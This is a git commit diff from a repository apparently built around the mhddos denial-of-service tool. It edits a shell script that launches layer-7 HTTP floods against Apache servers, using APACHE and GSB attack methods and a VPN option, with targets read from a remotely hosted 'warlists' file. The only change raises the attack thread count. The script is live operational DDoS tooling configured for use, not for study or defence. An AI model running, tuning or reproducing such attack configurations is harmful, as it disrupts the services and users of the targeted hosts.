9c4542b4c25cdb9380d90cd7840aa019c020b259
Flux State <f1ux.state@pm.me>
2022-04-24 16:14:00 +0200

    mhddos targets cleanup and update - scripts

--- scripts/run_l7_apache.sh
+++ scripts/run_l7_apache.sh
@@ -4,5 +4,5 @@ python3 runner.py \
   --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_apache.lst \
   --debug \
   --http-methods APACHE GSB \
-  --threads 32 \
+  --threads 34 \
   --vpn 90
